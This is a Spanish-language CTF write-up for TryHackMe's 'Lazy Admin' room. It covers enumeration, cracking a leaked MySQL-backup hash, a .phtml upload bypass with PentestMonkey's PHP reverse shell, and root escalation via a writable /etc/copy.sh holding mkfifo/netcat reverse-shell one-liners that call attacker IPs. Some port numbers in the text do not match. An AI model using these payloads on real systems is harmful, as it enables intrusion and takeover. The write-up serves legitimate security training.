# 🚀 Write-up CTF: Lazy Admin (TryHackMe)

La sala Lazy Admin de TryHackMe es una máquina Linux clasificada como fácil, ideal para practicar habilidades de enumeración, explotación web y escalada de privilegios. 

Nuestro objetivo es obtener las banderas de usuario y de root.

## 💻 Paso 1: Reconocimiento Inicial (Ping)

El primer paso en cualquier prueba de penetración es confirmar que la máquina objetivo está activa y accesible en la red. Para esto, utilizamos la herramienta ping en nuestra terminal Kali, limitando el número de paquetes a enviar con la opción -c 4.

<img width="599" height="355" alt="Ping" src="https://github.com/user-attachments/assets/24c5f1e5-378e-44ff-9178-53a2507d6f27" />


ping -c 4 10.10.181.238	El host responde, confirmando conectividad.

📡 Ejecución del Comando

````Bash
ping -c 4 10.10.181.238
````

✅ Resultado Confirmado

La captura de pantalla proporcionada, indica que la máquina objetivo con la IP 10.10.181.238 está activa y responde, con un 0% de pérdida de paquetes.


## 🔎 Paso 2: Escaneo de Puertos y Servicios (Nmap)

Una vez confirmada la accesibilidad de la máquina, el siguiente paso crucial es el escaneo de puertos para identificar qué servicios están corriendo en el objetivo.

Para esto, utilizaremos la herramienta Nmap con las siguientes opciones:

sV: Detección de versión de los servicios.

sC: Uso de scripts básicos por defecto para obtener más información.

T4: Para una ejecución más rápida.

<img width="851" height="325" alt="Nmap" src="https://github.com/user-attachments/assets/2ce6100e-cde3-4dad-90a6-e949877d0d0a" />


⚙️ Ejecución del Comando
````Bash
nmap -sV -sC -T4 -oN nmap_scan 10.10.181.238
````

📋 Resultados del Escaneo

El escaneo de Nmap (mostrado en la imagen) revela dos puertos abiertos y sus respectivos servicios:

Puerto	Estado	Servicio	Versión/Información

22/tcp	open	ssh	OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Protocolo 2.0)

80/tcp	open	http	Apache httpd 2.4.18 (Ubuntu). El título de la página es "Apache Ubuntu Default Page: It works".


🎯 Conclusiones Iniciales

La presencia del puerto 80 (HTTP) es el punto de entrada más prometedor. Dado que el servicio SSH (puerto 22) requiere credenciales, exploraremos primero la aplicación web alojada en el servidor Apache para buscar vulnerabilidades.



## 🌐 Paso 3: Exploración del Puerto 80 (HTTP)

El escaneo de Nmap confirmó que el puerto 80 está abierto y corriendo un servidor web Apache. El siguiente paso lógico es visitar la dirección IP del objetivo en un navegador web para ver qué contenido se sirve.

<img width="1535" height="837" alt="Pagina Puerto 80" src="https://github.com/user-attachments/assets/b0ab018d-ad8e-4bbb-bdf1-444a0a9acbe6" />


🖼️ Resultado de la Visita

Al acceder a http://10.10.181.238 (según la captura), encontramos la Página de bienvenida predeterminada de Apache2 en Ubuntu ("Apache2 Ubuntu Default Page: It works!").

🔍 Conclusión

Esta página predeterminada no contiene información útil para la explotación. Esto indica dos cosas:

El administrador no ha reemplazado el archivo index.html predeterminado.

El contenido real o la aplicación web del CTF debe estar alojado en un subdirectorio o subdominio que no está siendo mostrado en la raíz.



## 📁 Paso 4: Enumeración de Directorios (Gobuster)

Dado que la raíz del servidor web solo mostraba la página por defecto de Apache, el paso siguiente y necesario es la fuerza bruta de directorios (Directory Brute-Forcing) para encontrar contenido oculto. Utilizamos la herramienta Gobuster para esta tarea.


⚙️ Ejecución del Comando

Ejecutamos gobuster en modo de directorio (dir) contra la IP objetivo, utilizando una wordlist común de directorios:

<img width="878" height="286" alt="gobuster a la ip" src="https://github.com/user-attachments/assets/4fec3957-ff17-4290-aaf3-c017c85b305e" />

````
Bash
gobuster dir -u http://10.10.181.238 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
````

🎯 Descubrimiento Clave

El escaneo de gobuster es exitoso y revela un directorio significativo:

Directorio Encontrado	Código de Estado	Enlace de Redirección

/content	301 (Moved Permanently)	--> http://10.10.181.238/content/

El código de estado 301 indica que el servidor nos está redirigiendo permanentemente a una nueva ubicación, en este caso, al mismo directorio con una barra inclinada al final (/).



## Paso 5: Análisis del Directorio /content

Tras descubrir el directorio /content con Gobuster, procedemos a visitarlo en el navegador para entender qué aplicación web está en ejecución.

<img width="952" height="734" alt="pagina web directorio content" src="https://github.com/user-attachments/assets/02c9bdd1-e9c7-4495-ab20-eaa47928bd46" />


🖼️ Resultado de la Visita

Al acceder a http://10.10.181.238/content/, se muestra una página de aviso de mantenimiento:

Mensaje Clave: "Welcome to SweetRice - Thank your for install SweetRice as your website management system."

Pie de Página: "Powered by Basic-CMS.ORG SweetRice."

📝 Conclusiones y Próximo Movimiento

La visita al directorio nos proporciona una información crítica:

CMS Identificado: El sitio está utilizando el CMS SweetRice.

Estado: La página está en "mantenimiento" ("This site is building now, please come late.").

El hecho de haber identificado el Content Management System (CMS) es un gran avance. Ahora podemos dirigir nuestra enumeración a buscar:

Vulnerabilidades conocidas (CVEs) para SweetRice.

Archivos o directorios sensibles específicos de la instalación de SweetRice (por ejemplo, rutas de administración, archivos de configuración, etc.).


## 🕵️ Paso 6: Enumeración Profunda de Directorios en /content

Dado que ya identificamos que el CMS es SweetRice, realizamos otra ronda de enumeración de directorios, pero esta vez dirigida al subdirectorio /content, que es donde probablemente reside la aplicación.

<img width="1131" height="352" alt="gobuster al directorio content" src="https://github.com/user-attachments/assets/77182881-60cf-4695-aafb-7ecb10ea080e" />


⚙️ Ejecución del Comando

Ejecutamos gobuster nuevamente, ajustando la URL para incluir el directorio descubierto previamente:

````Bash
gobuster dir -u http://10.10.181.238/content -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
````

📋 Resultados del Escaneo

El escaneo revela varios directorios comunes de un CMS (como /images, /js, etc.), pero hay uno que destaca por ser una ruta típica de acceso administrativo:

Directorio Encontrado	Código de Estado	Comentario

/images	301	Archivos de imagen estáticos.

/js	301	Archivos JavaScript.

/inc	301	Incluye (código o archivos de configuración).

/as	301	¡Ruta de interés! Podría ser la ruta de Administración (Admin Section).

/themes	301	Temas visuales del CMS.

/attachment	301	Archivos adjuntos.

🔑 Foco en /as

El directorio /as es el más prometedor, ya que en muchos sistemas, una abreviatura como esta se utiliza para la sección de administración, lo que nos permitiría iniciar sesión en el panel del CMS.


## 🚶 Paso 7: Revisión de Directorios Secundarios (/js y /images)

Es una buena práctica revisar los listados de directorios si el servidor lo permite, buscando archivos de configuración o versiones que puedan ser útiles.

🖼️ Directorio /content/js/

<img width="655" height="472" alt="pag directorio js nada interesante" src="https://github.com/user-attachments/assets/018b58da-3a11-43a1-8f97-a0345d9bf6fa" />

Al visitar http://10.10.181.238/content/js/, se muestra un listado de archivos JavaScript.

Archivos Encontrados: SweetRice.js, excancvas.compiled.js, function.js, init.js, pins.js.

Información Relevante: No se detecta ninguna información sensible o credenciales. La revisión de los nombres confirma la estructura interna de archivos del CMS SweetRice.

🖼️ Directorio /content/images/

<img width="594" height="636" alt="pag directorio image nada interesante" src="https://github.com/user-attachments/assets/c6614fc3-fd2d-462c-b067-1cbfe12f341c" />

Al visitar http://10.10.181.238/content/images/, se muestra un listado de archivos de imagen y estáticos.

Archivos Encontrados: Iconos, captchas, favicons, etc.

Información Relevante: Nada de interés inmediato para la explotación.


## 🔑 Paso 8: Descubrimiento y Descarga de Credenciales (Directorio /inc)

La revisión exhaustiva del resto de directorios arrojó un descubrimiento crítico.

💰 Directorio /content/inc/

<img width="848" height="722" alt="pag directorio inc carpeta interesante" src="https://github.com/user-attachments/assets/dac082cf-b2fd-4385-a093-9488d2254665" />

Al visitar http://10.10.181.238/content/inc/, se muestra un listado de archivos de inclusión PHP. El archivo más interesante es un directorio que suele contener información sensible:

Directorio Clave: mysql_backup/


💾 Acceso a mysql_backup/

<img width="781" height="354" alt="backup de la bbdd la descargue" src="https://github.com/user-attachments/assets/959f0a5d-2450-41b2-a719-1c40172e7190" />

Al acceder a http://10.10.181.238/content/inc/mysql_backup/, se revela un archivo de backup de la base de datos MySQL con un nombre que incluye la fecha:

Archivo Encontrado: mysql_backup_20191129023059-1.5.1.sql

Este tipo de archivos casi siempre contiene las credenciales de acceso (nombres de usuario y hashes de contraseñas) para el CMS SweetRice.



## 🔐 Paso 9: Acceso al Panel de Administración (Login)

Hemos identificado:

La página de inicio de sesión del CMS SweetRice en http://10.10.181.238/content/as/

<img width="1398" height="640" alt="pag directorio as pagina de inicio de sesion interesante!!" src="https://github.com/user-attachments/assets/5a8a3000-c739-4368-b501-ffe99826eb8b" />

Revisamos tambien el codigo fuente en busca de alguna cosa interesante pero no surgió nada importante.

<img width="1168" height="891" alt="codigo fuente de as" src="https://github.com/user-attachments/assets/a2c98b41-9dfb-4c37-ba48-3ba176a7113c" />


## 📚 Paso 10: Extracción de Credenciales del Archivo SQL

Confirmamos el proceso de extracción de credenciales analizando el archivo de backup de la base de datos que descargamos en el Paso 8.

<img width="404" height="40" alt="leeremos la bbdd comando a utilizar" src="https://github.com/user-attachments/assets/98bcd9a9-0fe4-4859-b28c-dec915d283e2" />


⚙️ Ejecución del Comando

Utilizamos el comando cat para ver el contenido completo del archivo SQL:

```Bash
cat mysql_backup_20191129023059-1.5.1.sql
````

<img width="1893" height="370" alt="contraseña en formato hash del manager" src="https://github.com/user-attachments/assets/6382aea1-b720-4841-bd05-b6fa214b5c1d" />

🧐 Análisis y Hash Descubierto

Al revisar el contenido (líneas de INSERT INTO), buscamos la tabla que contiene la información del usuario (sr_user o la línea que define el administrador / manager). Encontramos la entrada para el usuario 'manager' y su hash de contraseña.

## 🔓 Paso 11: Descifrado del Hash de la Contraseña

<img width="1346" height="553" alt="desciframos la contraseña" src="https://github.com/user-attachments/assets/0d856838-9d43-4760-b978-abff94c5c45e" />

⚙️ Crackeo del Hash Desconocido

Utilizamos una herramienta de crackeo de hashes en línea (como la mostrada, CrackStation) para identificar la contraseña de texto plano:

Hash de Entrada	Tipo	Resultado (Contraseña)

42f749ade7f9e195bf475f37a44cafcb	MD5	Password123


## 🖥️ Paso 12: Acceso al Panel de Administración y Búsqueda de RCE

Con las credenciales descubiertas en el archivo de backup SQL, hemos obtenido acceso al panel de administración del CMS SweetRice.

🔑 Acceso con Credenciales

Credenciales del usuario:

Credencial	Valor

Usuario	manager

Contraseña	Password123


## 🖼️ Panel de Control (/content/as/)

Al iniciar sesión, somos redirigidos al Dashboard del sistema, confirmando que la versión instalada es SweetRice v.1.5.1.

El objetivo principal ahora es encontrar una funcionalidad que nos permita ejecutar código en el servidor. Buscamos opciones como subir archivos, editar plantillas, o módulos de plugins.

<img width="1151" height="764" alt="accdemos a la pagina" src="https://github.com/user-attachments/assets/51655adb-03d4-434d-88b7-c0985eb8c47c" />


Observamos el menú de la izquierda:

Category

Post ⬅️ ¡Punto de interés!

Comment

Attachment 

Setting

...

Media Center


## 💥 Paso 13: Preparación para Inyección de Shell (Función Post)

Continuando con la búsqueda de una ruta de ejecución de código remoto (RCE), hemos identificado la sección Post > List Create como un posible vector de ataque.

<img width="998" height="873" alt="en esta seccion del panel podremos subir un script de reverse" src="https://github.com/user-attachments/assets/4b9e779a-72c8-488b-971b-b1b1b0a09fd7" />


🖼️ Análisis de la Función de Subida

Al hacer clic en Post y luego en List Create, vemos la interfaz para crear una nueva entrada de blog o contenido. En la parte inferior de la página, hay una sección crucial:

Attachment: Add File ⬅️ ¡Este es el punto clave!

Esta función permite adjuntar archivos a la publicación, lo que significa que el CMS debe tener una lógica de subida y almacenamiento de archivos. 

Si el CMS no valida correctamente la extensión o el contenido de los archivos, podemos subir un script de shell inverso en PHP.


## 😈 Paso 14: Configuración del Payload PHP Reverse Shell

Para obtener acceso a la máquina, necesitamos un script que, al ejecutarse en el servidor, establezca una conexión de vuelta a nuestra máquina atacante. 

El estándar de oro para esto es el PHP Reverse Shell de PentestMonkey.

💾 Descarga y Modificación del Script

<img width="968" height="232" alt="utilizamos el de pentestmonkey" src="https://github.com/user-attachments/assets/0f1f2eff-ebcc-4ae8-a269-4e885478436e" />

Descarga: Obtenemos el script php-reverse-shell.php de PentestMonkey.

Configuración: Es crucial modificar las variables $ip y $port dentro del archivo para que coincidan con la configuración de nuestro listener:

<img width="639" height="239" alt="modificamos parametros del script" src="https://github.com/user-attachments/assets/f2ef2803-a9ba-49ba-a815-0a59d1aa9abe" />

$ip: Debe ser la IP de nuestra máquina Kali (la IP en la VPN de TryHackMe, en el ejemplo, 10.0.2.15).

$port: Debe ser el puerto que abriremos para escuchar la conexión (en el ejemplo, 9001).

PHP

$ip = '10.0.2.15';   // IP de la máquina atacante (Kali)
$port = 9001;        // Puerto de escucha en Kali

Renombramiento del Script

Para eludir posibles filtros básicos de archivos, renombraremos el script. Aunque el CMS SweetRice v1.5.1 en este contexto no suele tener validaciones estrictas, es una buena práctica.

````
Bash
mv php-reverse-shell.php shell.php
````


## 🛑 Paso 15: Intento de Subida de Shell y Detección de Filtro

Hemos preparado nuestro payload y procedemos a cargarlo a través de la sección de Attachments (o el botón Add File de la función Post/List Create).

📤 Intento de Carga del Archivo

<img width="1000" height="227" alt="cargamos el script en el panel" src="https://github.com/user-attachments/assets/788f7cc5-97fc-4fde-aa09-97dda5191c42" />

Cargamos nuestro archivo php-reverse-shell.php modificado a través del uploader del CMS.

Posteriormente, intentamos verificar si el archivo se subió correctamente visitando la ruta de adjuntos por defecto: http://10.10.181.238/content/attachment/.

<img width="689" height="284" alt="no vemos el archivo php subido, estra filtrando la extension" src="https://github.com/user-attachments/assets/cad8adca-7fcb-4127-a3f8-58f7f4037f88" />

🚨 Detección de Filtrado

Al visitar el directorio /content/attachment/, solo vemos el directorio padre, y nuestro archivo PHP no aparece en el listado.

Conclusión: El CMS SweetRice o la configuración del servidor web está aplicando un filtro de extensión (o blacklist) que impide la subida de archivos con la extensión .php por razones de seguridad.



## ⚙️ Paso 16: Bypassing del Filtro y Subida Exitosa del Shell

El intento inicial de subir un archivo .php falló debido al filtrado del CMS (Paso 15). Aplicamos la técnica de bypass para superar esta restricción.

🔄 Bypassing del Filtro

<img width="472" height="175" alt="renombramos el archivo" src="https://github.com/user-attachments/assets/24b2ea76-8b2c-48ea-9396-a0ea50052742" />

Renombramiento: Renombramos el script de shell de PentestMonkey, cambiando la extensión de .php a .phtml. El archivo renombrado es: php-reverse-shell.phtml.

````
Bash
mv php-reverse-shell.php php-reverse-shell.phtml
````

Nueva Subida: Cargamos el archivo php-reverse-shell.phtml a través del panel de Attachments.

<img width="596" height="175" alt="subimos otra vez el archivo renombrado" src="https://github.com/user-attachments/assets/7dab9d35-b54c-436c-87b5-0ad455f7b385" />


✅ Confirmación de Subida

<img width="605" height="265" alt="ahora si subio" src="https://github.com/user-attachments/assets/7592de70-643b-4bd7-b58f-cfbde1f936b3" />


Al verificar el directorio de adjuntos (http://10.10.181.238/content/attachment/), ahora vemos que el archivo ha sido subido con éxito:

Ruta de Ejecución: http://10.10.181.238/content/attachment/php-reverse-shell.phtml


## 💥 Paso 17: Obtención de Acceso Inicial (Reverse Shell)

Ahora que tenemos el payload en el servidor y su ruta de ejecución, es momento de configurar nuestro listener y activarlo.

👂 Configuración del Listener

Abrimos una nueva terminal en nuestra máquina Kali y configuramos un oyente de Netcat en el puerto que especificamos en el script (Paso 14):

<img width="437" height="98" alt="servidor de escucha" src="https://github.com/user-attachments/assets/f6d8528a-27a2-4336-817a-2271004bfcda" />

````
Bash
nc -lvnp 9001
````

🎯 Ejecución del Shell
Visitamos la URL de nuestro script subido en el navegador para activar la conexión inversa:

http://10.10.181.238/content/attachment/php-reverse-shell.phtml

Al visitar esta URL, el script PHP se ejecuta en el servidor y establece una conexión con nuestro listener de Netcat.

💻 Shell Obtenido

En la terminal de Netcat, recibimos la conexión y confirmamos nuestro acceso como un usuario de bajo privilegio:

<img width="958" height="231" alt="conseguimos el shell" src="https://github.com/user-attachments/assets/3777e7fb-c774-46bd-a828-d9c52bda67ae" />


## 🚩 Paso 18: Post-Explotación y Captura de la Bandera de Usuario

Una vez que hemos obtenido la reverse shell como el usuario de bajo privilegio www-data, el siguiente objetivo es la fase de Post-Explotación: mejorar la shell y encontrar la primera bandera (user.txt).

🐍 Estabilización de la Shell

<img width="989" height="531" alt="encontramos la bandera" src="https://github.com/user-attachments/assets/ccf40b56-a364-4455-9967-a3677655cbeb" />

La shell inicial de Netcat es simple y carece de funcionalidades importantes (como usar las teclas de flecha o el historial de comandos). Para mejorarla, ejecutamos un comando simple de Python:

````
Bash
python -c 'import pty;pty.spawn("/bin/bash")'
````

Esto nos proporciona una shell de Bash semi-interactiva, mucho más cómoda para la navegación.

🔍 Localización y Captura de la Bandera de Usuario

Una vez con la shell estable, navegamos por el sistema de archivos buscando la carpeta home del usuario:

Exploración de Directorios: Navegamos al directorio /home para listar los usuarios del sistema.

````
Bash
cd /home
ls
````
Descubrimos un usuario llamado itguy.

Acceso al Directorio del Usuario:

````
Bash
cd itguy
ls
````

Al listar el contenido del directorio del usuario itguy, encontramos el archivo objetivo: user.txt.

Lectura de la Bandera: Utilizamos el comando cat para leer el contenido del archivo:

````
Bash
cat user.txt
````
Bandera de Usuario Encontrada:

THM{63e5t...}


## 👑 Paso 19: Escalamiento de Privilegios

Hemos obtenido la bandera de usuario y ahora nuestro objetivo es escalar a root. Comenzamos la fase de enumeración de privilegios desde la shell de www-data.

🔍 Detección de Permisos de Sudo

<img width="821" height="172" alt="elevar privilegios" src="https://github.com/user-attachments/assets/bfc7b64e-8073-43de-a2bb-3fe367adfc7a" />


Lo primero que verificamos es si el usuario www-data puede ejecutar algún comando con sudo sin necesidad de contraseña:

````
Bash
sudo -l
````


El resultado revela un vector de escalada de privilegios crítico:

User www-data may run the following commands on THM-Chal:

(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

Vemos el archivo backup en pearl:

<img width="730" height="130" alt="vemos el archivo backup en pearl" src="https://github.com/user-attachments/assets/2966ca35-64f3-4acc-8949-e3438eb91e04" />

Leemos el archivo:

<img width="390" height="90" alt="leemos el arhicvo backup" src="https://github.com/user-attachments/assets/b4376bb0-eb4a-4c36-9ce2-5d33253efaf2" />


Conclusión: El usuario www-data puede ejecutar el script de Perl ubicado en /home/itguy/backup.pl como cualquier usuario (ALL), y lo más importante, sin requerir contraseña (NOPASSWD). Esto significa que podemos ejecutarlo como root.



## 💻 Paso 20: Explotación del Script Perl (backup.pl)

Analizamos el script que podemos ejecutar con privilegios elevados.

📝 Análisis del Contenido del Script

Navegamos al directorio y leemos el contenido del script backup.pl:

<img width="390" height="90" alt="leemos el arhicvo backup" src="https://github.com/user-attachments/assets/39f77ff5-b429-4be4-81d5-f541631811ce" />


````
Bash
cat /home/itguy/backup.pl
````

````
Perl
#!/usr/bin/perl
````
system("sh", "/etc/copy.sh");
El script backup.pl ejecuta otro script llamado /etc/copy.sh usando sh.

🔑 Chequeo de Permisos y lectura del script en /etc/copy.sh

Este es el punto clave. Si podemos modificar el contenido de /etc/copy.sh, y luego ejecutar backup.pl como root, nuestro código malicioso se ejecutará con permisos de root.

Leemos el script:

<img width="703" height="65" alt="usamos cat para leer el copy sh, ejecuta el script" src="https://github.com/user-attachments/assets/02c54c62-9d0b-4c4f-ab9e-4c4ad15bef94" />


Confirmamos permisos que podemos ejecutarlo:

<img width="851" height="167" alt="usario www data puede ejecutarse" src="https://github.com/user-attachments/assets/d27b35e7-ff8d-4835-a560-e836a440ef0e" />


## 🔥 Paso 21: Inyección de Shell y Ejecución como Root

En el Paso 20, descubrimos que el usuario www-data podía ejecutar el script de Perl /home/itguy/backup.pl con permisos de sudo (como root). También descubrimos que este script a su vez ejecuta el archivo /etc/copy.sh:

````
Perl
system("sh", "/etc/copy.sh");
````

✍️ Verificación y Modificación de /etc/copy.sh

El archivo /etc/copy.sh es la clave, y en este CTF, el usuario www-data tiene permisos de escritura sobre él. Esto nos permite inyectar nuestro propio comando para obtener una reverse shell con privilegios de root.

1. Comando Actual de /etc/copy.sh (Ejemplo de la captura):

   
<img width="727" height="181" alt="script copy sh" src="https://github.com/user-attachments/assets/0268a0ae-2832-4fa9-be47-074c25e1333e" />

````
Bash
$ cat /etc/copy.sh
/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
````
(Nota: Este script ya contiene una inyección de shell para una IP diferente, lo que confirma que el archivo es modificable.)

2. Inyección de Nuestro Payload:

Modificamos /etc/copy.sh para que contenga un reverse shell que se conecte a nuestra IP  en el puerto 5554.

<img width="1124" height="78" alt="modificamos el script de perl con la ip y puerto" src="https://github.com/user-attachments/assets/42826a70-212b-419c-b5b3-d2d3c7474f2f" />

Utilizamos echo para sobrescribir el contenido del archivo con el payload de reverse shell de Netcat (usando el truco de la TTY, aunque la forma simple también funciona).

````
Bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.147.155 5555 >/tmp/f" > /etc/copy.sh
````
Nota: El comando inyectado en la captura es más complejo y robusto, pero el objetivo es el mismo: forzar una conexión a nuestro listener.

👂 Configuración del Listener de Root

Antes de ejecutar el script, abrimos un nuevo listener de Netcat en nuestra máquina Kali en el puerto especificado:

````
Bash
nc -lvnp 5554
````

🚀 Ejecución del Script como Root

Finalmente, ejecutamos el script backup.pl con sudo. Esto obligará al sistema a ejecutar /etc/copy.sh con los permisos de root.

Bash
sudo /usr/bin/perl /home/itguy/backup.pl

👑 Root Shell Obtenida

Al ejecutar el comando sudo, el payload inyectado en /etc/copy.sh se ejecuta, y la conexión de root shell entra en nuestro listener de Netcat.

<img width="638" height="128" alt="ya tenemos privilegios shell" src="https://github.com/user-attachments/assets/b01dbb50-54fc-4a53-b3a4-c89001566398" />


## 🚩 Paso 22: Captura de la Bandera de Root

Una vez que somos root, la bandera final está en el directorio /root.

<img width="436" height="127" alt="bandera de root" src="https://github.com/user-attachments/assets/67688f21-5e50-452d-aae5-ae4d08a95c3e" />

````
Bash
cd /root
ls
cat root.txt
````
Bandera de Root Encontrada:

THM{...}
